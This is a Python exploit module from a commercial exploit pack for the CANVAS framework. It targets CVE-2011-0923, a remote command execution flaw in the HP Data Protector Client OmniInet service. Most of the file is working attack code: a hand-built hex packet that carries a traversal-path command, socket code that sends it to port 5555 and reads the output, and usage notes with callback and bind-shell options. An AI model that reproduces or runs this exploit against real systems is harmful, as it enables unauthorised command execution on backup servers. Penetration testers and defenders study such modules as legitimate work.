
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF import pelib
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Hewlett-Packard Data Protector Client EXEC_CMD Remote Command Execution"
DESCRIPTION = "Exploits a remote command execution vulnerability in the HP Data Protector Backup Client OmniInet service"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Hewlett-Packard'
DOCUMENTATION["Date public"] = "2011-02-07"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0923'
DOCUMENTATION['CVE Name']="CVE-2011-0923"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-055/"
DOCUMENTATION["Notes"] = """
This module exploits a remote command execution flaw in the Hewlett-Packard Data Protector Client OmniInet service (TCP/5555 by default).

No paramaters or command line arguements may be passed.
No PATH is available so executables must be traversed to from C:\Program Files\OmniBack\\bin\. Combine ../ to directory traverse to the target binary.

-O command:\"../../../windows/system32/whoami.exe\" is valid
-O command:\"../../../windows/system32/whoami.exe /ALL\" is invalid
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
This module exploits a remote command execution flaw in the Hewlett-Packard Data Protector Client OmniInet service (TCP/5555 by default).

Usage:
No PATH is available so executables must be traversed to from C:\Program Files\OmniBack\bin\. Combine ../ to directory traverse to the target binary.
No paramaters or command line arguements may be passed.

-O command:../../../windows/system32/whoami.exe = valid
-O command:../../../windows/system32/whoami = invalid

---------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Hewlett-Packard Data Protector Client EXEC_CMD Remote Command Execution
---------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_hp_dataprotector_exec_cmd/wp_hp_dataprotector_exec_cmd.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0 -O command:"../../../windows/system32/whoami.exe"
"""

PORT = 5555
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.useRawShellcode = True
        self.ExecCmd = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makesploit(self):
        payload = (
            "\x20\x32\x00\x20\x41\x42\x43\x44\x45\x46\x47\x48\x00\x20\x30\x00"
            "\x20\x53\x59\x53\x54\x45\x4d\x00\x20\x41\x42\x43\x44\x45\x46\x47"
            "\x48\x00\x20\x43\x00\x20\x32\x30\x00\x20\x41\x42\x43\x44\x45\x46"
            "\x47\x48\x00\x20\x50\x6f\x63\x00\x20\x4e\x54\x41\x55\x54\x48\x4f"
            "\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48\x4f\x52\x49\x54"
            "\x59\x00\x20\x4e\x54\x41\x55\x54\x48\x4f\x52\x49\x54\x59\x00\x20"
            "\x30\x00\x20\x30\x00\x20")
        payload = payload.replace('ABCDEFGH', "".join( [ random.choice(string.lowercase) for x in range(8) ] ))
        payload += self.execCMD
        payload += "\x00\x00"
        payload = pack('>L', len(payload)) + payload
        return payload

    def run(self):
        self.getArgs()
        self.result_error = 0
        
        try:
            if self.shell_EXECCMD:
                self.ExecCmd = True
        except:
            self.ExecCmd = False
            
        payload = self.makesploit()
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.send(payload)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        time.sleep(3)
        replied = False
        try:
            reply = s.recv(32768)
            replied = True
            reply += s.recv(32768)
            reply += s.recv(32768)
            reply += s.recv(32768)
            reply += s.recv(32768)
            reply += s.recv(32768)
            reply += s.recv(32768)
        except:
            ignore = ""
        
        if replied:
            self.log("WP> Received reply:")
            self.log("\n%s\n"%onlystrings(reply))
            ret = 1
        else:
            ret = 0
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret
    
if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
